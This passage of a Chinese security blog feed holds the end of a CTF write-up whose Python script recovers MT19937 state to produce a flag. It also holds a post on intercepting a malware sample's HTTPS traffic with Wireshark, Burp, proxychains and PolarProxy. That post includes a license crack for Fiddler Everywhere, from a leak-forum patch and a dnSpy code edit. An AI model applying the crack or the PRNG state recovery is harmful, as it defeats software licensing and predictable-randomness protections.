style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">8</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></p><p>于是我猜想可能在进行足够多次的迭代运算后得到的结果是<br /><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>a</mi><mn>0</mn></msub><mo>=</mo><msub><mi>b</mi><mn>0</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>0</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">a_{0} = b_{0} \oplus b_{0} \oplus b_{0}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></p><p>即<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>a</mi><mn>0</mn></msub><mo>=</mo><msub><mi>b</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">a_{0} = b_{0}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></p><p>编写脚本验证想法</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">equ = [</span><br><span class="line">[<span class="number">0</span>, <span class="number">11</span>, <span class="number">15</span>],</span><br><span class="line">[<span class="number">1</span>, <span class="number">12</span>, <span class="number">16</span>],</span><br><span class="line">[<span class="number">2</span>, <span class="number">13</span>, <span class="number">17</span>],</span><br><span class="line">[<span class="number">3</span>, <span class="number">14</span>, <span class="number">18</span>],</span><br><span class="line">[<span class="number">4</span>, <span class="number">15</span>, <span class="number">19</span>],</span><br><span class="line">[<span class="number">5</span>, <span class="number">16</span>, <span class="number">20</span>],</span><br><span class="line">[<span class="number">6</span>, <span class="number">17</span>, <span class="number">21</span>],</span><br><span class="line">[<span class="number">7</span>, <span class="number">18</span>, <span class="number">22</span>],</span><br><span class="line">[<span class="number">8</span>, <span class="number">19</span>, <span class="number">23</span>],</span><br><span class="line">[<span class="number">9</span>, <span class="number">20</span>, <span class="number">24</span>],</span><br><span class="line">[<span class="number">10</span>, <span class="number">21</span>, <span class="number">25</span>],</span><br><span class="line">[<span class="number">11</span>, <span class="number">22</span>, <span class="number">26</span>],</span><br><span class="line">[<span class="number">12</span>, <span class="number">23</span>, <span class="number">27</span>],</span><br><span class="line">[<span class="number">13</span>, <span class="number">24</span>, <span class="number">28</span>],</span><br><span class="line">[<span class="number">14</span>, <span class="number">25</span>, <span class="number">29</span>],</span><br><span class="line">[<span class="number">15</span>, <span class="number">26</span>, <span class="number">30</span>],</span><br><span class="line">[<span class="number">16</span>, <span class="number">27</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">17</span>, <span class="number">28</span>, <span class="number">0</span>],</span><br><span class="line">[<span class="number">18</span>, <span class="number">29</span>, <span class="number">1</span>],</span><br><span class="line">[<span class="number">19</span>, <span class="number">30</span>, <span class="number">2</span>],</span><br><span class="line">[<span class="number">20</span>, <span class="number">31</span>, <span class="number">3</span>],</span><br><span class="line">[<span class="number">21</span>, <span class="number">0</span>, <span class="number">4</span>],</span><br><span class="line">[<span class="number">22</span>, <span class="number">1</span>, <span class="number">5</span>],</span><br><span class="line">[<span class="number">23</span>, <span class="number">2</span>, <span class="number">6</span>],</span><br><span class="line">[<span class="number">24</span>, <span class="number">3</span>, <span class="number">7</span>],</span><br><span class="line">[<span class="number">25</span>, <span class="number">4</span>, <span class="number">8</span>],</span><br><span class="line">[<span class="number">26</span>, <span class="number">5</span>, <span class="number">9</span>],</span><br><span class="line">[<span class="number">27</span>, <span class="number">6</span>, <span class="number">10</span>],</span><br><span class="line">[<span class="number">28</span>, <span class="number">7</span>, <span class="number">11</span>],</span><br><span class="line">[<span class="number">29</span>, <span class="number">8</span>, <span class="number">12</span>],</span><br><span class="line">[<span class="number">30</span>, <span class="number">9</span>, <span class="number">13</span>],</span><br><span class="line">[<span class="number">31</span>, <span class="number">10</span>, <span class="number">14</span>]]</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> copy</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">self_xor</span>(<span class="params">number1, number2</span>):</span></span><br><span class="line">new_equ = []</span><br><span class="line">length = <span class="built_in">len</span>(equ)</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">equ1 = [x <span class="keyword">for</span> x <span class="keyword">in</span> equ[_]]</span><br><span class="line">equ2 = [x <span class="keyword">for</span> x <span class="keyword">in</span> equ[(_ + number1)%length]]</span><br><span class="line">equ3 = [x <span class="keyword">for</span> x <span class="keyword">in</span> equ[(_ + number2)%length]]</span><br><span class="line"><span class="keyword">for</span> __ <span class="keyword">in</span> equ2:</span><br><span class="line"><span class="keyword">if</span> __ <span class="keyword">in</span> equ1:</span><br><span class="line">equ1.pop(equ1.index(__))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">equ1.append(__)</span><br><span class="line"><span class="keyword">for</span> __ <span class="keyword">in</span> equ3:</span><br><span class="line"><span class="keyword">if</span> __ <span class="keyword">in</span> equ1:</span><br><span class="line">equ1.pop(equ1.index(__))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">equ1.append(__)</span><br><span class="line">new_equ.append(equ1)</span><br><span class="line"><span class="keyword">return</span> new_equ</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">equ = self_xor(<span class="number">25</span>, <span class="number">13</span>)</span><br><span class="line">equ = self_xor(<span class="number">18</span>, <span class="number">26</span>)</span><br><span class="line">equ = self_xor(<span class="number">4</span>, <span class="number">20</span>)</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> equ:</span><br><span class="line">print(_)</span><br></pre></td></tr></table></figure><p>最后的输出结果可以验证想法正确，且获得了迭代异或运算的<code>shitf</code>值<br />第二条语句的逆向算法同理</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bits_xor</span>(<span class="params">bits, shift1, shift2</span>):</span></span><br><span class="line">old_bits = bits</span><br><span class="line">length = <span class="built_in">len</span>(bits)</span><br><span class="line">new_bits = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">new_bits = new_bits + <span class="built_in">str</span>(<span class="built_in">int</span>(old_bits[_]) ^ <span class="built_in">int</span>(old_bits[(_+shift1)%length]) ^ <span class="built_in">int</span>(old_bits[(_+shift2)%length]))</span><br><span class="line"><span class="keyword">return</span> new_bits</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cs2l</span>(<span class="params">y, shift</span>):</span></span><br><span class="line"><span class="keyword">return</span> ((y &lt;&lt; shift) ^ (y &gt;&gt; (<span class="number">32</span> - shift))) &amp; <span class="number">0xffffffff</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cs2r</span>(<span class="params">y, shift</span>):</span></span><br><span class="line"><span class="keyword">return</span> ((y &gt;&gt; shift) ^ (y &lt;&lt; (<span class="number">32</span> - shift))) &amp; <span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reverse_cs2l</span>(<span class="params">y</span>):</span></span><br><span class="line">bits = <span class="built_in">bin</span>(y)[<span class="number">2</span>:]</span><br><span class="line">bit_len = <span class="built_in">len</span>(bits)</span><br><span class="line">bits32 = <span class="string">&quot;0&quot;</span> * (<span class="number">32</span> - bit_len) + bits</span><br><span class="line">bits32 = bits_xor(bits32, <span class="number">11</span>, <span class="number">15</span>)</span><br><span class="line">bits32 = bits_xor(bits32, <span class="number">22</span>, <span class="number">30</span>)</span><br><span class="line">bits32 = bits_xor(bits32, <span class="number">12</span>, <span class="number">28</span>)</span><br><span class="line">number = <span class="built_in">int</span>(bits32, <span class="number">2</span>)</span><br><span class="line"><span class="keyword">return</span> number</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reverse_cs2r</span>(<span class="params">y</span>):</span></span><br><span class="line">bits = <span class="built_in">bin</span>(y)[<span class="number">2</span>:]</span><br><span class="line">bit_len = <span class="built_in">len</span>(bits)</span><br><span class="line">bits32 = <span class="string">&quot;0&quot;</span> * (<span class="number">32</span> - bit_len) + bits</span><br><span class="line">bits32 = bits_xor(bits32, <span class="number">25</span>, <span class="number">13</span>)</span><br><span class="line">bits32 = bits_xor(bits32, <span class="number">18</span>, <span class="number">26</span>)</span><br><span class="line">bits32 = bits_xor(bits32, <span class="number">4</span>, <span class="number">20</span>)</span><br><span class="line">number = <span class="built_in">int</span>(bits32, <span class="number">2</span>)</span><br><span class="line"><span class="keyword">return</span> number</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;./output.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">data = f.read().split(<span class="string">&quot;, &quot;</span>)</span><br><span class="line">f.close()</span><br><span class="line">MT = []</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> data:</span><br><span class="line">MT.append(reverse_cs2l(reverse_cs2r(<span class="built_in">int</span>(_))))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>):</span><br><span class="line">y = (MT[i] &amp; <span class="number">0x80000000</span>) + (MT[(i+<span class="number">1</span>)%<span class="number">624</span>] &amp; <span class="number">0x7fffffff</span>)</span><br><span class="line">MT[i] = MT[(i+<span class="number">397</span>)%<span class="number">624</span>] ^ (y &gt;&gt; <span class="number">1</span>)</span><br><span class="line"><span class="keyword">if</span> y &amp; <span class="number">1</span>:</span><br><span class="line">MT[i] ^= <span class="number">2567483520</span></span><br><span class="line"></span><br><span class="line">y = MT[<span class="number">0</span>]</span><br><span class="line">y = y ^ cs2l(y, <span class="number">11</span>) ^ cs2l(y, <span class="number">15</span>)</span><br><span class="line">y = y ^ cs2r(y, <span class="number">7</span>) ^ cs2r(y, <span class="number">19</span>)</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line">flag = <span class="string">&#x27;DASCTF&#123;&#x27;</span> + md5(<span class="built_in">str</span>(y).encode()).hexdigest() + <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DASCTF&#123;49e225e5b1b57a1d3c9803b5ddfd38f9&#125;</span><br></pre></td></tr></table></figure><hr /><p>后面两题随缘更新</p><hr /><p>更个锤子，Crypto2 3想破头都没思路</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;老样子，赛后解题&lt;/p&gt;</summary>
    
    
    
    <category term="WriteUp" scheme="https://yoloyolo.top/categories/WriteUp/"/>
    
    
    <category term="Crypto" scheme="https://yoloyolo.top/tags/Crypto/"/>
    
    <category term="MT19937" scheme="https://yoloyolo.top/tags/MT19937/"/>
    
  </entry>
  
  <entry>
    <title>恶意程序HTTPS解密</title>
    <link href="https://yoloyolo.top/2022/05/14/Malware-HTTPS-Decryption/"/>
    <id>https://yoloyolo.top/2022/05/14/Malware-HTTPS-Decryption/</id>
    <published>2022-05-14T23:54:29.000Z</published>
    <updated>2022-06-10T17:44:30.000Z</updated>
    
    <content type="html"><![CDATA[<p>距离省考宣布寄了已经过去了两个月了<br />于是打了两个月的游戏，属实是打吐了<br />出来去原来的单位实习<br />上来就是分析病毒<br />在摸索的过程中产生了这篇文章</p><a id="more"></a><h1 id="0x00-wireshark"><a class="markdownIt-Anchor" href="#0x00-wireshark"></a> 0x00 Wireshark</h1><p>尝试抓包恶意软件</p><p>开启Wireshark，运行恶意程序，全是HTTPS的数据</p><p>看了下网上的资料可以设置环境变量<code>$SSLKEYLOGFILE</code>来设置SSL密钥临时文件的位置，然后在Wireshark里导入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> SSLKEYLOGFILE=/tmp/tls.log</span><br></pre></td></tr></table></figure><p>Edit→ Preferences → Protocols → TLS → (Pre-)Master-Secret log filename</p><p>选择环境变量<code>$SSLKEYLOGFILE</code>的内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://www.baidu.com/</span><br></pre></td></tr></table></figure><p>即可<code>$SSLKEYLOGFILE</code>中看到HTTPS的密钥</p><p>Wireshark中也可以看到解密的HTTPS流量</p><p>但是运行恶意程序，恶意程序发起的HTTPS请求后并不会在<code>$SSLKEYLOGFILE</code>写入密钥</p><p>所以这个方法行不通</p><p>有想到过自己看TLS的密钥协商过程，写个脚本来计算出<strong>Master Secret Key</strong>，然后导入Wireshark来解密已保存的流量，但水平有限写不出来</p><p>好吧，正常情况</p><hr /><h1 id="0x01-burpsuite"><a class="markdownIt-Anchor" href="#0x01-burpsuite"></a> 0x01 Burpsuite</h1><p>将Burpsuite证书设置为系统证书（与<a href="https://yoloyolo.top/2021/08/01/Summary-For-Android-APP-Test/#%E7%94%A8%E6%88%B7%E8%AF%81%E4%B9%A6%E4%B8%8E%E7%B3%BB%E7%BB%9F%E8%AF%81%E4%B9%A6">这篇文章</a>类似）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">burpsuite&amp;</span><br><span class="line">curl -O http://127.0.0.1:8080/cert</span><br><span class="line">openssl x509 -inform DER -<span class="keyword">in</span> cert -out burp.crt</span><br><span class="line">mv burp.crt /usr/<span class="built_in">local</span>/share/ca-certificates/</span><br><span class="line">update-ca-certificates</span><br></pre></td></tr></table></figure><p>设置系统代理</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> http_proxy=<span class="string">&quot;http://127.0.0.1:8080/&quot;</span></span><br><span class="line"><span class="built_in">export</span> https_proxy=<span class="string">&quot;http://127.0.0.1:8080/&quot;</span></span><br></pre></td></tr></table></figure><p>命令行里的curl和python都能被抓到https的数据包</p><p>但是恶意软件的流量抓不到</p><p>使用proxychains代理</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt-get install proxychains</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;http 127.0.0.1 8080&quot;</span> &gt;&gt; /etc/proxychains.conf</span><br><span class="line">proxychain ./fritzfrog</span><br></pre></td></tr></table></figure><p>(配置文件<code>/etc/proxychains.conf</code>好像默认有一个socks4的代理？自己看着删掉吧)</p><p>但是恶意软件的流量还是抓不到</p><p>大概是这个恶意程序设置的是不走系统的代理吧，只能说开发人员有点水平</p><hr /><h1 id="0x02-fiddler-everywhere"><a class="markdownIt-Anchor" href="#0x02-fiddler-everywhere"></a> 0x02 Fiddler Everywhere</h1><p>想着在Fiddler上抓一下全局流量，结果Fiddler4在linux上面用不了，只能用mono运行一个老版本</p><p>还是用Fidder Everywhere吧</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://downloads.getfiddler.com/linux/fiddler-everywhere-3.2.0.AppImage</span><br><span class="line">chmod +x fiddler-everywhere-3.2.0.AppImage</span><br><span class="line">./fiddler-everywhere-3.2.0.AppImage</span><br></pre></td></tr></table></figure><p>注册，登录，“Your 30-day free trial has expired!”</p><p>看来是得破解一下了</p><p><a href="https://www.jianshu.com/p/5ce61cbae73a">AppImage格式操作说明</a></p><p>网上逛逛找到了个补丁</p><p><a href="https://leakforums.su/threads/fiddler-everywhere-3-2-0-cracked.138919/#post-311448">补丁下载</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fiddler-everywhere-3.2.0.AppImage --appimage-extract</span><br></pre></td></tr></table></figure><p><code>Fiddler.WebUi.dll</code>在<code>./squashfs-root/resources/app/out/WebServer/</code></p><p><code>main.3f983221e4e1aade.js</code>在<code>./squashfs-root/resources/app/out/WebServer/ClientApp/dist/</code></p><p>替换完成后进行打包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/AppImage/AppImageKit/releases/download/13/appimagetool-x86_64.AppImage</span><br><span class="line">mv appimagetool-x86_64.AppImage appimagetool</span><br><span class="line">chmod +x appiamgetool</span><br><span class="line">mv appimagetool /usr/<span class="built_in">local</span>/bin/</span><br><span class="line">ARCH=x86_64 appimagetool squashfs-root/</span><br><span class="line">./Fiddler_Everywhere-x86_64.AppImage</span><br></pre></td></tr></table></figure><p>卡在&quot;Please Wait&quot;界面，寄</p><p>根据这篇博客<a href="https://www.jysafe.cn/4785.air">[Linux]破解抓包软件FiddlerEverywhere 3.2.0 cracked</a>用dnspy改FiddlerBackendSDK.dll文件</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//raw</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> AccountDTO <span class="title">GetBestAccount</span>(<span class="params">UserWithBestAccountDTO user</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (user.BestEverywhereAccountId != <span class="literal">null</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> Enumerable.FirstOrDefault&lt;UserAccountDTO&gt;(user.Accounts, (UserAccountDTO x) =&gt; x.Id == user.BestEverywhereAccountId.Value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//modified</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> AccountDTO <span class="title">GetBestAccount</span>(<span class="params">UserWithBestAccountDTO user</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> Enumerable.FirstOrDefault&lt;UserAccountDTO&gt;(user.Accounts, (UserAccountDTO x) =&gt; <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>改成这样重打包dll，替换原dll后重打包appimage</p><p>运行后还是卡在&quot;Please Wait&quot;界面，寄</p><p>浪费了大半天的时间<del>混了大半天</del></p><hr /><h1 id="0x03-polarproxy"><a class="markdownIt-Anchor" href="#0x03-polarproxy"></a> 0x03 Polarproxy</h1><p>之前想着恶意程序既然能够绕过系统代理，那我把网卡的流量用iptables整个重定向到Burpsuite不就行了</p><p>但是实际上还是不行，自己大概思考了一下，这玩意估计把TCP握手的流量也丢给Burpsuite了，Burpsuite估计是处理不了TCP流量，然后就寄了（未验证）</p><p>混了大半天，突然脑子有个想法，google上搜了一下&quot;how to decrypt malware https traffic&quot;</p><p>然后第一个结果就介绍了PolarProxy这个工具，去官网看了一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PolarProxy is a transparent SSL&#x2F;TLS proxy created for incident responders and malware researchers. PolarProxy is primarily designed to intercept and decrypt TLS encrypted traffic from malware. PolarProxy decrypts and re-encrypts TLS traffic, while also saving the decrypted traffic in a PCAP file that can be loaded into Wireshark or an intrusion detection system (IDS).</span><br></pre></td></tr></table></figure><p>看来自己是找对东西了</p><p>这玩意得单独用个用户运行，不然到时候iptables重定向会跟这玩意整个死循环出来</p><p>安装并启用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sudo adduser --system --shell /bin/bash proxyuser</span><br><span class="line">sudo mkdir /var/<span class="built_in">log</span>/PolarProxy</span><br><span class="line">sudo chown proxyuser:root /var/<span 